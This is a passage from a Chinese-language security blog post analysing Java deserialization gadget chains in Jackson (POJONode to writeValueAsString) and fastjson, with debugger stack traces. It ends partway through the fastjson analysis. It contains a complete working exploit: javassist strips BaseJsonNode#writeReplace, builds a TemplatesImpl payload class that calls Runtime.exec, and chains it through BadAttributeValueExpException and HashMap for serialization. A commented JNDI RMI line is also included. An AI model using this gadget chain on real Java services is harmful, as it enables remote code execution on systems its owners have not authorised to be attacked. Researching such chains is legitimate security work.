class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.jsonser;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jacksonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Message</span> &#123;<br>        <span class="hljs-type">int</span> code;<br>        String detail;<br>        Object data;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Message</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCode</span><span class="hljs-params">(<span class="hljs-type">int</span> code)</span> &#123;<br>            <span class="hljs-built_in">this</span>.code = code;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDetail</span><span class="hljs-params">(String detail)</span> &#123;<br>            <span class="hljs-built_in">this</span>.detail = detail;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setData</span><span class="hljs-params">(Object data)</span> &#123;<br>            <span class="hljs-built_in">this</span>.data = data;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getCode</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;getCode&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.code;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDetail</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;getDetail&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.detail;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getData</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-built_in">this</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.data;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Message</span><span class="hljs-params">(<span class="hljs-type">int</span> code, String detail)</span> &#123;<br>            <span class="hljs-built_in">this</span>.code = code;<br>            <span class="hljs-built_in">this</span>.detail = detail;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Message</span><span class="hljs-params">(<span class="hljs-type">int</span> code, String detail, Object data)</span> &#123;<br>            <span class="hljs-built_in">this</span>.code = code;<br>            <span class="hljs-built_in">this</span>.detail = detail;<br>            <span class="hljs-built_in">this</span>.data = data;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> JsonProcessingException &#123;<br><br>        <span class="hljs-type">Message</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>();<br>        message.setCode(<span class="hljs-number">114514</span>);<br>        message.setDetail(<span class="hljs-string">&quot;thai want to test jackson&quot;</span>);<br><br>        <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">objectMapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> objectMapper.writeValueAsString(message);<br><br><br>        System.out.println(<span class="hljs-string">&quot;jackon string: &quot;</span> + s);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="image-20240113033842334.png" alt="image-20240113033842334"></p><p>可以看见Jackson在序列化，会调用javaBean的所有getter方法。</p><h3 id="0x02-人心浮躁，本人只学剑招，瞎分析"><a href="#0x02-人心浮躁，本人只学剑招，瞎分析" class="headerlink" title="0x02. 人心浮躁，本人只学剑招，瞎分析"></a>0x02. 人心浮躁，本人只学剑招，瞎分析</h3><p>打一个断点</p><p><img src="image-20240113034938265.png" alt="image-20240113034938265"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">getData:<span class="hljs-number">38</span>, jacksonTest$Message (com.jsonser)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>serializeAsField:<span class="hljs-number">689</span>, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)<br>serializeFields:<span class="hljs-number">774</span>, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)<br>serialize:<span class="hljs-number">178</span>, BeanSerializer (com.fasterxml.jackson.databind.ser)<br>_serialize:<span class="hljs-number">480</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)<br>serializeValue:<span class="hljs-number">319</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)<br>_writeValueAndClose:<span class="hljs-number">4568</span>, ObjectMapper (com.fasterxml.jackson.databind)<br>writeValueAsString:<span class="hljs-number">3821</span>, ObjectMapper (com.fasterxml.jackson.databind)<br>main:<span class="hljs-number">60</span>, jacksonTest (com.jsonser)<br></code></pre></td></tr></table></figure><p>DefaultSerializerProvider#serializeValue</p><p><img src="image-20240113040440387.png" alt="image-20240113040440387"></p><p><img src="image-20240113040501753.png" alt="image-20240113040501753"></p><p>通过<code>findTypedValueSerializer</code>来从缓存中获取序列化器得到BeanSerializer。然后进行序列化</p><p>然后来到<code>BeanSerializer#serialize</code></p><p><img src="image-20240113041018608.png" alt="image-20240113041018608"></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">BeanSerializerBase<span class="hljs-meta">#serializeFields</span><br></code></pre></td></tr></table></figure><p><img src="image-20240113041420589.png" alt="image-20240113041420589"></p><p>Bean类中的所有属性值的写入</p><p><img src="image-20240113041821522.png" alt="image-20240113041821522"></p><p>最后是能够调用对应属性值的getter方法进行赋值。</p><h3 id="0x03-构造链子"><a href="#0x03-构造链子" class="headerlink" title="0x03 构造链子"></a>0x03 构造链子</h3><p>通过上面分析，控制BeanSerializer，就可以对Bean类中的所有属性值进行getter。</p><p>writeValueAsString是jackson的反序列化入口。</p><p>所以找一个能触发writeValueAsString的就行。</p><p>com.fasterxml.jackson.databind.node.InternalNodeMapper#nodeToString</p><p><img src="image-20240113042939146.png" alt="image-20240113042939146"></p><p>com.fasterxml.jackson.databind.node.BaseJsonNode#toString</p><p><img src="image-20240113043101253.png" alt="image-20240113043101253"></p><p>所以要早一个可以序列化,然后触发BaseJsonNode#toString()。</p><p>网上的找到一个</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.fasterxml</span><span class="hljs-selector-class">.jackson</span><span class="hljs-selector-class">.databind</span>.node#POJONode<br></code></pre></td></tr></table></figure><p><img src="image-20240113043546441.png" alt="image-20240113043546441"></p><p>可以他继承ValueNode，<img src="image-20240113043613018.png" alt="image-20240113043613018"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">ValueNode继承BaseJsonNode<br></code></pre></td></tr></table></figure><p>POJONode，ValueNode，都没有tostring()方法，所以POJONode.tostring会触发BaseJsonNode.tostring()</p><p>最后完成序列化触发getter。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">POJONode#toString -&gt; InternalNodeMapper#nodeToString -&gt; ObjectWriter.writeValueAsString<br></code></pre></td></tr></table></figure><h3 id="0x04-exp"><a href="#0x04-exp" class="headerlink" title="0x04 exp"></a>0x04 exp</h3><p>在写入序列化时会进行判断是否实现了<code>writeReplace</code>方法</p><p><img src="image-20240113044413128.png" alt="image-20240113044413128"></p><p><code>OJONode</code>的父类<code>BaseJsonNode</code>中就实现了这个方法，在这个方法的调用过程中抛出了异常，使得序列化过程中断</p><p>我们可以通过删除这个方法来跳过这个过程，进而成功的序列化。</p><p><img src="image-20240113044543157.png" alt="image-20240113044543157"></p><p>所以使用javassist删除就好</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool1</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool1.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br><span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>jsonNode.removeMethod(writeReplace);<br><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>jsonNode.toClass(classLoader, <span class="hljs-literal">null</span>);<br><span class="hljs-type">ClassPool</span> <span class="hljs-variable">aDefault</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br></code></pre></td></tr></table></figure><p>最终exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.jsonser;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.ArrayNode;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.management.remote.JMXServiceURL;<br><span class="hljs-keyword">import</span> javax.management.remote.rmi.RMIConnector;<br><span class="hljs-keyword">import</span> javax.management.remote.rmi.RMIServer;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><span class="hljs-keyword">import</span> java.sql.DatabaseMetaData;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jackson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title function_">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-literal">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br><span class="hljs-comment">//        jdbcRowSet.getDatabaseMetaData();</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a calculator\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;xx&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool1</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">jsonNode</span> <span class="hljs-operator">=</span> pool1.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> jsonNode.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>            jsonNode.removeMethod(writeReplace);<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br>            jsonNode.toClass(classLoader, <span class="hljs-literal">null</span>);<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">aDefault</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> aDefault.get(<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>);<br><span class="hljs-comment">//            for (CtMethod declaredMethod : ctClass.getDeclaredMethods()) &#123;</span><br><span class="hljs-comment">//                String methodname = declaredMethod.getName();</span><br><span class="hljs-comment">//                if ((methodname.startsWith(&quot;get&quot;)))&#123;</span><br><span class="hljs-comment">//                   if (!(methodname.equals(&quot;getDatabaseMetaData&quot;)))&#123;</span><br><span class="hljs-comment">//                    CtMethod rmmethod = ctClass.getDeclaredMethod(methodname);</span><br><span class="hljs-comment">//                    ctClass.removeMethod(rmmethod);</span><br><span class="hljs-comment">//                   &#125;</span><br><span class="hljs-comment">//                &#125;</span><br><span class="hljs-comment">//            &#125;</span><br><span class="hljs-comment">//            ctClass.toClass(classLoader,null);</span><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br><span class="hljs-comment">//        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();</span><br><span class="hljs-comment">//        jdbcRowSet.setDataSourceName(&quot;rmi://127.0.0.1:1099/remoteExploit8&quot;);</span><br><span class="hljs-comment">//        POJONode node = new POJONode(jdbcRowSet);</span><br><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        jsonObject.put(<span class="hljs-string">&quot;1&quot;</span>,templates);<br><br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(val,<span class="hljs-string">&quot;val&quot;</span>,jsonObject);<br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(templates,val);<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./jackson&quot;</span>));<br>            outputStream.writeObject(hashMap);<br>            outputStream.close();<br><br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./jackson&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h2><h3 id="0x01-demo偷学剑招"><a href="#0x01-demo偷学剑招" class="headerlink" title="0x01 demo偷学剑招"></a>0x01 demo偷学剑招</h3><p>没实力直接抄代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.jsonser;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jacksonTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Message</span> &#123;<br>        <span class="hljs-type">int</span> code;<br>        String detail;<br>        Object data;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Message</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCode</span><span class="hljs-params">(<span class="hljs-type">int</span> code)</span> &#123;<br>            <span class="hljs-built_in">this</span>.code = code;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDetail</span><span class="hljs-params">(String detail)</span> &#123;<br>            <span class="hljs-built_in">this</span>.detail = detail;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setData</span><span class="hljs-params">(Object data)</span> &#123;<br>            <span class="hljs-built_in">this</span>.data = data;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getCode</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;getCode&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.code;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getDetail</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;getDetail&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.detail;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getData</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-built_in">this</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.data;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Message</span><span class="hljs-params">(<span class="hljs-type">int</span> code, String detail)</span> &#123;<br>            <span class="hljs-built_in">this</span>.code = code;<br>            <span class="hljs-built_in">this</span>.detail = detail;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Message</span><span class="hljs-params">(<span class="hljs-type">int</span> code, String detail, Object data)</span> &#123;<br>            <span class="hljs-built_in">this</span>.code = code;<br>            <span class="hljs-built_in">this</span>.detail = detail;<br>            <span class="hljs-built_in">this</span>.data = data;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> JsonProcessingException &#123;<br><br>        <span class="hljs-type">Message</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>();<br>        message.setCode(<span class="hljs-number">114514</span>);<br>        message.setDetail(<span class="hljs-string">&quot;thai want to test jackson&quot;</span>);<br><br><span class="hljs-comment">//        ObjectMapper objectMapper = new ObjectMapper();</span><br><span class="hljs-comment">//        String s = objectMapper.writeValueAsString(message);</span><br><br>        com.alibaba.fastjson.JSONArray.toJSON(message);<br><br><br><span class="hljs-comment">//        System.out.println(&quot;jackon string: &quot; + s);</span><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="image-20240113213730812.png" alt="image-20240113213730812"></p><p>在序列化，会调用javaBean的所有getter方法。</p><h3 id="0x02-fastjson剑招瞎分析"><a href="#0x02-fastjson剑招瞎分析" class="headerlink" title="0x02 fastjson剑招瞎分析"></a>0x02 fastjson剑招瞎分析</h3><h4 id="jsonobject-jsonarray分析"><a href="#jsonobject-jsonarray分析" class="headerlink" title="jsonobject,jsonarray分析"></a>jsonobject,jsonarray分析</h4><p><img src="image-20240113213919079.png" alt="image-20240113213919079"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">getData:<span class="hljs-number">40</span>, jacksonTest$Message (com.jsonser)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>get:<span class="hljs-number">544</span>, FieldInfo (com.alibaba.fastjson.util)<br>getPropertyValue:<span class="hljs-number">153</span>, FieldSerializer (com.alibaba.fastjson.serializer)<br>getFieldValuesMap:<span class="hljs-number">797</span>, JavaBeanSerializer (com.alibaba.fastjson.serializer)<br>toJSON:<span class="hljs-number">1106</span>, JSON (com.alibaba.fastjson)<br>toJSON:<span class="hljs-number">1012</span>, JSON (com.alibaba.fastjson)<br>main:<span class="hljs-number">64</span>, jacksonTest (com.jsonser)<br></code></pre></td></tr></table></figure><p>com&#x2F;alibaba&#x2F;fastjson&#x2F;JSON.java#toJSON()</p><p><img src="image-20240113214817756.png" 